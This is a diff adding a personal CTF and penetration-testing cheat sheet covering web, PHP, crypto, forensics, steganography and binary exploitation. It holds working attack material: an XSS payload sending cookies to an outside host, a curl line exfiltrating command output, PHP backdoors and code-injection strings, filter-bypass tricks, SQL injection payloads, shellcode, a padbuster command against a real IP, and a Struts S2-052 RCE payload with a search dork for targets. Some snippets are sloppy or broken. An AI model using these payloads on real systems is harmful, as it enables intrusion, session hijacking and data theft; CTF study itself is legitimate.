@@ -1,0 +1,613 @@
+IMPORTANT FACT
+=========================================================================
+*webscreenshot to capture shot of webpages
+*magick hacshes->https://www.whitehatsec.com/blog/magic-hashes/
+*apache sometime directory listing
+*hashcat,hash-identifier
+*view page source, and visit every directory u found in source code
+** check every possible way, dont be lazzy
+**if any send message or comment try "><script>window.location="//x.com"+document.cookie> to get cookie
+**if there is like id=123 then consider id=1/0 as admin account and continue attack
+
+COMMAND WITHOUT SPACE
+======================
+1. ls$IFS-l;
+2. {cat,file.txt}
+3. IFS=:;a=cat:file.txt;$a
+
+
+1. list directory of current folder=>  ls -d */
+2.list all subdirectory of folder => find . -maxdepth 2 -type d
+3. execute system command inside quote => echo "`id`", echo "$(id)", curl http://x.com/`id`
+4.shortest php backdoor
+----------------------
+<?=`ls`; # work <?=@`ls`; # work and I found this " ~ " can also work . <?=~`ls`; # work but unicode (or something). so, <?=~`ls>test.txt`; # work
+
+4a. upload php file with this tag and it execute as php <script language="php"> </script> 
+
+5.echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u <target> 11211 =>memcached server
+
+6.w'h'o'am'i , w"h"o"am"i, who$@ami ,$0 = /bin/bash so , echo whoami|$0
+
+7.padding oracle =>padbuster(bellow) detect using decode base64 and count caracter ,it wouldbe multipleof 8,16
+
+8.PHP offers three frequently used methods of parsing and consuming XML: PHP DOM, SimpleXML and XMLReader. All three of these use the libxml2 extension and external entity support is enabled by default. As a consequence, PHP has a by-default vulnerability to XXE .
+DOMDocument::loadXML()====> also vulnerable to xxe
+
+$dom = new DOMDocument;
+$dom->loadXML($xmlString);
+this code is vulnerableto xxe
+
+mitigation
+--------
+$oldValue = libxml_disable_entity_loader(true);
+$dom = new DOMDocument();
+$dom->loadXML($xml);
+libxml_disable_entity_loader($oldValue);
+
+/**
+ * Attempt a quickie detection
+ */
+$collapsedXML = preg_replace("/[:space:]/", '', $xml);
+if(preg_match("/<!DOCTYPE/i", $collapsedXml)) {
+    throw new \InvalidArgumentException(
+        'Invalid XML: Detected use of illegal DOCTYPE'
+    );
+}
+
+
+$oldValue = libxml_disable_entity_loader(true);
+$dom = new DOMDocument;
+$dom->loadXML($xml);
+libxml_disable_entity_loader($oldValue);
+foreach ($dom->childNodes as $child) {
+    if ($child->nodeType === XML_DOCUMENT_TYPE_NODE) {
+        throw new \InvalidArgumentException(
+            'Invalid XML: Detected use of illegal DOCTYPE'
+        );
+    }
+}
+
+
+9. <?php
+$doc = new DOMDocument();
+$doc->load('book.xml');
+echo $doc->saveXML();
+?> it may also vulnerable to directory travarsal
+
+10.
+ filter_var($_GET['http_url'], FILTER_VALIDATE_URL);
+it allow javascript://foobar%0aalert(), php://, zip:// data://
+
+
+DEBUGING JAVASCRIPT
+==========================================================================================
+chrome->source tab->
+create breakpoint anywhere,refresh page,and hover over the varriable before breakpoint and see varriable value.
+in right side you can see all local and global varriable value
+
+PHP
+====================================================================================================================================================================
+1.TYPE JUGGLING
+----------------
+ Try to use functions and operators that do not do implicit type conversions (e.g. === and not ==). Not all operators have strict versions (for example greater than and less than), and many built-in functions (like in_array) use weakly typed comparison functions by default,
+
+2. shell executte(shell_exec,exec,proc_open,passthru,system backtick operator,popen,pcntl_exec)
+   execute(eval,preg_replace with /e modifier,include[_once]/require[_once],create_function,assert(),file_get_contents,readfile,glob,mysql_query )
+more=> https://stackoverflow.com/questions/3115559/exploitable-php-functions
+
+3.
+      $db_link = mysqli_connect('localhost', 'dbuser', 'dbpassword', 'dbname');
+
+   function can_access_feature($current_user) {
+       global $db_link;
+       $username = mysqli_real_escape_string($db_link, $current_user->username);
+       $res = mysqli_query($db_link, "SELECT COUNT(id) FROM blacklisted_users WHERE username = '$username';");
+       $row = mysqli_fetch_array($res);
+       if ((int)$row[0] > 0) {
+           return false;
+       } else {
+           return true;
+       }
+   }
+
+for example, the database connection could fail, due to a wrong password or the server being down etc., or the connection could be closed by the server after it was opened client side. In these cases, by default the mysqli_ functions will issue warnings or notices, but will not throw exceptions or fatal errors. This means that the code simply carries on! The variable $row becomes NULL, and PHP will evaluate $row[0] also as NULL, and (int)$row[0] as 0, due to weak typing. Eventually the can_access_feature function returns true, giving access to all users, whether they are on the blacklist or not. 
+
+4.
+  $location = $_POST['location'];
+  $filename = "./sites/".$user.".php";
+		  ...................etc......................
+		  $html = "<?php
+		  \$regdate = \"$date\";
+		  \$user = \"$user\";
+		  \$pass = \"$pass1\";
+		  \$email = \"$email1\";
+		  \$location = \"$location\";
+		  \$url = \"$url\";
+		  ?>";
+		  $fp = fopen($filename, 'a+');
+		  fputs($fp, $html) or die("Could not open file!");
+
+pass this $location = "";?><?php system($_GET['cmd']);?><?php $xxx=":D";
+
+5. 
+   <?php
+		   $code=$_GET['code'];
+		   eval($code); 
+		   ?>
+
+http://127.0.0.1/test.php?code=system(whoami);
+***must use termination statement ;
+
+6.
+ <?php
+		   if ($logged==true) {
+		   echo 'Logged in.'; }
+		   else {
+		   print 'Not logged in.';
+		   }
+		   ?>
+  http://127.0.0.1/test/php?logged=1 and need to _gloabals = on.
+
+7. XMLRPC
+-------------
+<?xml version="1.0"?> <methodCall> <methodName>test.method</methodName> 	<params> 		<param> 		<value><name>','')); phpinfo(); exit;/*</name></value> 		</param> 	</params> </methodCall>
+
+8.
+  <?php
+if (isset($_GET['page'])) {
+    $page = $_GET['page'];
+} else {
+    $page = "home";
+}
+$file = "includes/" . $page . ".php";
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!"); // vulnerable code!
+>?
+http://example.com/inex.php/?page=’, ‘qwer’) === false && strlen(file_get_contents(“../../../../../etc/passwd”)) == 0 && strpos(‘1
+  
+9. $q=sprintf("UPDATE user set points=%d%s",$_GET['p'],$_GET[asd]])
+here admin password is flag ,so we need to extract password using sql injection
+$_GET['p']=1 and $_GET['asd']=*hex(substr((select password),1,1)); //substr or substring both we can use
+
+10. 
+    $validatedId = $_POST['id'];
+    $pdo = new PDO('mysql:store.db');
+    $stmt = $pdo->prepare('SELECT * FROM transactions WHERE user_id = :id');
+    $stmt->bindParam(':id', $validatedId, PDO::PARAM_INT);
+    $stmt->execute();
+it automatically escape $validateId parameter and placed in place holder
+
+code
+=========================================================================================
+  if(strcmp($PASSWORD, $_GET['password']) == 0){
+            $success = true;
+        }
+ if passed as password[]=AAAAA then it print success.
+
+WEB
+===============================================================================================
+===============================================================================================
+Problem
+----------
+The bad guys have hidden their access codes on an anonymous secure page service. Our intelligence tells us that the codes was posted on a page with id 43440b22864b30a0098f034eaf940730ca211a55, but unfortunately it's protected by a password, and only site moderators can view the post without the password. Can you help us recover the codes?
+>>>for this type ctf we have to create a page with XSS payload and receive cookie and the session hijacking
+
+Returning fake Row
+------------------------
+random'AND 1=0 UNION ALL SELECT 'admin' AS username, 'hax' AS password, 2000 AS user_level, 10 AS dummy, 10 AS dummy2 --
+
+Blind Sqli
+----------------
+admin' AND password LIKE "ya%" --
+
+
+Perl Vulneraility
+===================
+https://ehsandev.com/pico2014/web_exploitation/make_a_face.html
+http://www.cgisecurity.com/lib/sips.html
+
+
+PDF && PASSWORD
+=========
+rockyou.txt,500-passwords.txt
+pdfcrack --wordlist=crackstation-human-only.txt mypassword.pdf
+
+
+encryption/decryption
+=========================
+https://quipqiup.com/ (cryptogram)
+http://rumkin.com/tools/cipher/
+https://www.cs.drexel.edu/~introcs/Fa11/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt.html
+*if does not know what it is try vegenere cypher
+ https://www.guballa.de/vigenere-solver
+https://www.guballa.de/substitution-solver
+
+*foremost to recover file
+*unzip file using unzip so you can see also hidden file if there
+*xxd -e file //hexdump with hex and value
+binwalk
+=============
+binwalk music.mp3
+binwalk --dd='.*' music.mp3
+
+Volatility
+==================
+if a proceess running wireshark.exe then u can try search file abc.pcap etc
+volatility -f forensic_100.raw imageinfo  //image information
+volatility -f forensic_100.raw dumpfiles
+volatility -f forensic_100.raw clipboard //clipboard content
+volatility -f forensic_100.raw cmdscan
+volatility -f forensic_100.raw cmdline
+volatility -f forensic_100.raw consoles
+volatility -f forensic_100.raw connections
+volatility -f forensic_100.raw filescan  //file scan
+volatility -f forensic_100.raw filescan|grep bat //filescan any extension like .bat,.exe,.vbs etc also can search folder name like this
+also search file with system username
+volatility -f forensic_100.raw dumpfiles -Q 0x..... -D folder //dump file with specified offset
+volatility -f forensic_100.raw sockscan
+volatility -f forensic_100.raw netscan
+volatility -f forensic_100.raw connscan
+volatility -f forensic_100.raw pslist       //process list only visible process
+volatility -f forensic_100.raw psscan       //view hidden process also and exit time
+volatility -f forensic_100.raw --profile=asd psxview //
+volatility -f forensic_100.raw --profile=WinXPSP3x86 sockets //socket lists
+volatility -f forensic_100.raw pslist |grep svchost
+volatility -f forensic_100.raw --profile=zzxz pslist |grep tcp
+volatility -f forensic_100.raw -p 1704 -D dump procdump //dump process memory
+strings dump/asd.exe | pdb //compare fake file
+
+HASH
+==================
+1. john --list=formats|grep -i md4
+  john --format=Raw-MD4 test.md4 --show
+2.john file //here in file put httpbasic auth
+   
+md5 hash
+================
+240610708=>0e462097431906509019562988736854
+9QFHA$RNXGMR3IFDU=>0e11012cfa2a998691010213eebc6f98
+4E8F8TK=>0e1100867d17d34f6b50be0e7d4a576d
+5KWNPIES2BZZK=>0e1100864a0b680fa32cb64331ff48ad
+QNKCDZO=>
+BE||OJ@N =>0e110377766fb49c4d47a46eb4a1d8b8
+goto https://md5db.net/explore/ for specific pattern
+
+** base32 data only contain CAPITAL letter and =
+
+**input() in python equivalent to eval(raw_input())
+  os.system('/bin/sh') input gives shell
+**if python script is obfuscated then may try decode to decimal or something
+
+RSA
+===============
+generate publickey from n and e
+-------------------------------
+./RsaCtfTool.py --createpub --n 4152 --e 53327
+for multiple key
+---------------
+./RsaCtfTool.py --publickey "*.key" --verbose --private
+for singlekey
+---------------------
+./RsaCtfTool.py --publickey "a.key" --verbose --private
+
+*common factor
+*weiner attack when N is smaller than e ,also when N is in both public key
+*fermar factorization when p and q are close to sqrt(N)
+* if same messege encrypted with same e but different N then hastad broadcast
+-------------------------------------------------------------------------------
+#abctf2016
+import cryptanalib as ca
+n1=
+c1=
+n2=
+c2=
+n3=
+c3=
+c=ca.hastad_broadcast_attack([(c1,n1),(c2,n2),(c3,n3)], 3)
+print ca.long_to_string(c)
+
+
+ openssl s_client -connect <IP>:993 //connect to ssl /imap //also u can login via telnet
+a login "username" "password" //enter if dovecot is ready
+
+
+goto RsaCtfTool for different attack
+usefull features in RsaCtfTool
+openssl rsautl -decrypt -in $ENCRYPTED -out $PLAINTEXT -inkey keys/privkey.pem
+openssl rsautl -encrypt -in $PLAINTEXT -out $PLAINTEXT.encrypt -pubin -inkey keys/pubkey.pem
+
+phi = (p- 1) * (q-1)
+d = libnum.modular.invmod(e, phi)
+print libnum.n2s(pow(c, d, N))
+
+
+
+from Crypto.PublicKey import RSA
+f1 = open("pubkey1.txt", "r")
+key = RSA.importKey(f1.read())
+print "n1 =", key.n
+print "e1 =", key.e
+f2 = open("pubkey1.txt", "r")
+key = RSA.importKey(f1.read())
+print "n1 =", key.n
+print "e1 =", key.e
+f3 = open("flag.enc", "r")
+print f3.read().encode('hex')
+
+
+
+from Crypto.Cipher import AES
+from binascii import a2b_base64
+def AES_128_ECB_decrypt(data, key):
+  cipher = AES.new(key, AES.MODE_ECB)
+  return cipher.decrypt(data)
+filename = '7.txt'
+key = 'YELLOW SUBMARINE'
+data = a2b_base64(''.join(line.strip() for line in open(filename)))
+print AES_128_ECB_decrypt(data, key)
+
+
+def find_zero_md5md5():
+  for i in xrange(0,99999999):
+    t = str(i)
+    ct = t
+    ha = hashlib.md5()
+    ha.update(ct)
+    md5 = ha.hexdigest()
+    ha = hashlib.md5()
+    ha.update(md5+ "SALT")
+    md52 = ha.hexdigest()
+    if md52.startswith('0e') and md52[2:].isdigit():
+      return ct,md5,md52
+    if ((i % 1000000) == 0):
+      print i
+  return ""
+a,b,c = find_zero_md5md5()
+print a,b,c
+
+
+openssl rsa -in  task/bob3.pub -pubin -text -modulus
+openssl rsa -pubin -inform PEM -text -noout < bob.pub
+
+openssl enc   -aes-128-ecb -a -in input2 -out output -k "YELLOW SUBMARINE"
+openssl enc -d  -aes-128-ecb -a -in input2 -out output -k "YELLOW SUBMARINE"
+
+Use factordb.com to find p and q
+
+vigenere cypher
+=============
+https://www.guballa.de/vigenere-solver
+
+XOR
+==========
+1.first try to guess the key like flag{ and xor with cyphertext .
+   if there is more length of key then try to find them. 
+2. use exortool or kasiski examination to find key length
+ xortool -o a.txt
+ cat xortool_out/* | string | grep flag
+ 
+
+
+if does not know any idea what to do then xor it
+XOR three file
+-----------------
+def xor_strings(a, b):
+    return ''.join(chr(ord(i) ^ ord(j)) for i, j in zip(a, b))
+heart_clear = open('Heart_clear.txt').read()
+heart_crypt = open('Heart_crypt.txt').read()
+key = xor_strings(heart_clear, heart_crypt)
+mind_crypt = open('Mind_crypt.txt').read()
+mind_clear = xor_strings(mind_crypt, key)
+print mind_clear
+
+
+
+key = '\x96\xa4*\xc3\x96\x73'
+counter = 0
+answer = ''
+for i in open('cry200.txt', 'rb').read():
+    answer += chr(ord(i)^ord(key[counter%6]))
+    counter += 1
+print answer
+
+def xorr(text,key):
+    return ''.join(chr(ord(a)^ord(b)) for a,b in zip(text,key))
+text='KGZFK\qZFG]qA\qZFOZ'
+for i in range (128):
+    print xorr(text,chr(i)*len(text))
+
+
+ascii checking
+----------------------
+if all(ord(char) < 128 for char in text2):
+
+find length             find key                           encrypt file                        bruteforce key
+---------------     -----------------------------------   -------------------------------  ----------------- -------------------
+1. xortool a.txt      xortool test.txt.xor -l 10 -c 00      xortool test.txt "secret_key"    xortool -x encrypted.txt -b 
+
+*
+find key
+
+PADDING ORACLE
+=========================
+Decryption
+------------
+padbuster http://88.198.233.174:35082/profile.php yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg= 8 -encoding 0 --cookie "iknowmag1k=yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg=;PHPSESSID=tdd5b0jl58sf70ve667r9n1et6"
+
+Encryption
+---------------
+padbuster http://88.198.233.174:35082/profile.php yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg= 8 -encoding 0 --cookie "iknowmag1k=yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg=;PHPSESSID=tdd5b0jl58sf70ve667r9n1et6" -plaintext {\"user\":\"admin\",\"role\":\"admin\"}
+
+
+RAW HASH
+===============
+9fcef3897afe2acc3e7438ce14f5b6a3   raw hash make sql injection INCTF
+
+MEDIA
+====================
+mp3
+-----------
+https://academo.org/demos/spectrum-analyzer/
+
+mediainfo =>info about audio/video
+ffmpeg -i song.webm -map 0:2 out.wav => extract hidden audio file
+multimon-ng -t wav -a DTMF out.wav =>decode dual tone
+
+CRYPTO
+==============
+1.Xor 2.shift 3.RotN 4.Vegenere 5.substitution
+
+STTEGO
+======================================================================================================
+=====================================================================================================
+1.binwalk 2.exiftool 3.ghex 4.strings 5.openstego 6.stegsolve 7.steghide(support JPEG,BMP,wav,AU)
+
+steghide extract -sf steghide.jpg -p password (always use this for addition info or if password protected)
+
+if noclue about image the try reverse google image search
+ 
+if found image ,first check binwalk file.png for hidden file then extract using dd
+dd if=example.jpg bs=1 skip=1972141 of=foo.zip
+foremost -t zip -i exaple.jpg -o folder
+
+IMAGE PIXEL
+===============
+http://www.boyter.org/decoding-captchas/
+https://github.com/VulnHub/ctf-writeups/blob/master/2015/hackim/web-500.md
+
+from PIL import Image
+im = Image.open("dead_parrot.jpg")
+pix = im.load()
+width,height=im.size
+for i in range(width):
+ for j in range(height):
+  print pix[i,j]
+im.save("alive_parrot.png") # Save the modified pixels as png
+
+
+REVERSE ENG
+=============================================================================================================
+=============================================================================================================
+1.gdb 2.ida 3.r2
+
+BUFFER OVERFLOW
+================
+*python -c "print 'A'*32 + 'BBBB'" | strace -i ./pwn4 |& grep si_addr
+***
+1.first try to find out max length by segment fault like { python -c "print 'A'*30" |./a.out }
+2. now have to overwrite RT to some other function address.
+    {objdump -d ./a.out }  and find the function name.
+    Use gdb to find the address of that function
+    now type { python -c "print 'A'*30+'\x12\x44'" |./a.out }
+
+** 
+ltrace= find dynamic librabry 
+strace=  findsystem library
+
+shellcode
+-----------
+http://www.theprohack.com/2010/09/buffer-overflow-attack-tutorial-by.html
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 => 25 bytes https://dhavalkapil.com/blogs/Shellcode-Injection/
+\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80 => 32 bytes https://samsclass.info/127/proj/p3-lbuf1.htm
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  modified = 0;
+  gets(buffer);
+
+  if(modified != 0) {
+      printf("you have changed the 'modified' variable\n");
+  } else {
+      printf("Try again?\n");
+  }
+}
+
+
+
+
+                                push   %rbp        //push base pointer in stack
+   0x0000000000400505 <+1>:	    mov    %rsp,%rbp   //asign rsp as rbp
+   0x0000000000400508 <+4>:	    sub    $0x60,%rsp  //rsp move to rsp-96
+   0x000000000040050c <+8>:	    mov    %edi,-0x54(%rbp)
+   0x000000000040050f <+11>:	mov    %rsi,-0x60(%rbp)
+   0x0000000000400513 <+15>:	movl   $0x0,-0x4(%rbp)  //move zero to rbp-4 for modified=0
+   0x000000000040051a <+22>:	lea    -0x50(%rbp),%rax //buffer allocate , rbp-0x50 address of buffer where it starting move to rax
+   0x000000000040051e <+26>:	mov    %rax,%rdi
+   0x0000000000400521 <+29>:	callq  0x400410 <gets@plt> //call gets to this buffer
+   0x0000000000400526 <+34>:	mov    -0x4(%rbp),%eax    //value of rbp-4 is 0 move to eax
+   0x0000000000400529 <+37>:	test   %eax,%eax
+   0x000000000040052b <+39>:	je     0x400539 <main+53>
+   0x000000000040052d <+41>:	mov    $0x400648,%edi
+   0x0000000000400532 <+46>:	callq  0x4003f0 <puts@plt>
+   0x0000000000400537 <+51>:	jmp    0x400543 <main+63>
+   0x0000000000400539 <+53>:	mov    $0x400671,%edi
+   0x000000000040053e <+58>:	callq  0x4003f0 <puts@plt>
+   0x0000000000400543 <+63>:	leaveq 
+   0x0000000000400544 <+64>:	retq 
+
+
+so here modified varriable located at rbp-4 and its value is 0.buffer start at rbp-0x50 
+so we have to make it 1
+
+so total byte need to overwrite  modified verriable at rbp-4 address is $rbp-0x50-$rbp-0x4
+
+finding length of buffer overflow
+-----------------------------------
+* give input like AAAAA and if it gives segfault at specific number then it is total length from that buffer to RT.because after buffer fullit overwrite ebp then RT address.
+
+*run gdb , set break point ,give input AAAAAA.... and it hit breakpoint .
+run x/120x $esp and it gives values stored in stack
+find here address of values  0x41(A) and this is start address of buffer
+run x $ebp and it gives address  of $ebp
+now again run x/120X $esp and find offset between previous buffer address and $ebp
+ex:
+(gdb) x/120x $esp
+0xffffcec0:	0xfe	0xce	0xff	0xff	0x01	0x00	0x00	0x00
+0xffffcec8:	0xc2	0x00	0x00	0x00	0xd1	0xd1	0xff	0xff
+0xffffced0:	0xfe	0xce	0xff	0xff	0x00	0xd0	0xff	0xff
+>0xffffced8:	0x00	0x00	0x00	0x00	0x41	0x41	0x41	0x41
+0xffffcee0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcee8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcef0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcef8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcf00:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcf08:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcf10:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcf18:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcf20:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcf28:	0x00	0xcf	0xff	0xff	0x1d	0x85	0x04	0x08
+0xffffcf30:	0xd1	0xd1	0xff	0xff	0xf4	0xcf	0xff	0xff
+here buffer start at 0xffffcedc whhere value 0x41(because we gave AAAA.. as input)
+and $ebp at 0xffffcf28 ,so we can find offset between them + 4 RT
+ 
+
+FORMAT STRNGS
+-----------------
+%n is used to write in memory
+1.first find out where our data is located in stack using  => ./vuln `python -c "print 'AAAA '+'%x '*100"`
+2.it print AAAA 0xbffff.. 0xbff...  AAAA =>here do it still you your first string AAAA in last like here
+3.Here you have to replace AAAA with address to write in memory. 
+
+ROP
+------------
+
+RETURN TO LIB
+---------------
+
+STRUTS s2-052 rest plugin rce
+======================
+dork: filetype:action,do
+*first set content type application/xml in get request and send this data
+<map>
+<entry>
+<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>calc</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+</entry>
+</map>
